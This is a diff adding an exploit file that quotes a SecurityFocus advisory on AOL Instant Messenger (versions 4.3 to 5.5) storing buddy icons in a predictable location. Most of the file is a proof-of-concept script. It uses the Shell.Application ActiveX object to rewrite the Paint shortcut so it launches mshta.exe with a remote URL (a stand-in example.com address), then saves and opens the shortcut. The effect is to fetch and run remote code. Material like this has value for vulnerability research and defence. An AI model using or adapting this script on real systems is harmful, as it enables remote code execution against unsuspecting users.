@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/9698/info
+
+It has been reported that AOL Instant Messenger stores imported Buddy Icons in a predictable location on client systems that may allow an attacker to facilitate further attacks which could eventually lead to execution of arbitrary code.
+
+This issue has been tested on AOL Instant Messenger versions 4.3 to 5.5, however, it is possible that other versions are affected as well. 
+
+<script>
+var ok = new ActiveXObject("Shell.Application");
+f = ok.NameSpace("C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Accessories");
+i= f.ParseName("Paint.lnk");
+l = i.GetLink;
+l.Path = "mshta.exe"
+l.Arguments ="http://www.example.com"
+l.Save("C:\\paint.lnk");
+ok.Open("C:\\paint.lnk");
+</script> 
